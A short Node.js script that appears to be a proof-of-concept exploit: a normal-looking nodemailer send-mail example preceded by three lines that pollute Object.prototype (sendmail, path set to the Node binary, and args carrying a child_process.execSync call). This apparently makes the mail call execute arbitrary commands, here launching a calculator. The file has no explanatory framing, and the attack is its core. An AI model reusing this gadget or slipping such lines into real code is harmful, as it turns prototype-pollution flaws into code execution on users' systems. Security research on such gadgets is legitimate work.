const nodemailer = require('nodemailer');

Object.prototype.sendmail = 1;
Object.prototype.path = process.argv0;
Object.prototype.args = ['-e', 'require("child_process").execSync("calc")'];

// create reusable transporter object using the default SMTP transport
let transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'your.email@gmail.com',
    pass: 'your.email.password'
  }
});

// send mail with defined transport object
transporter.sendMail({
  from: 'sender@example.com',
  to: 'recipient@example.com',
  subject: 'Hello from Nodemailer',
  text: 'This is a test email sent from Nodemailer with default parameters!'
}, function(error, info) {
  if (error) {
    console.log('Error occurred:', error);
  } else {
    console.log('Message sent: %s', info.messageId);
  }
});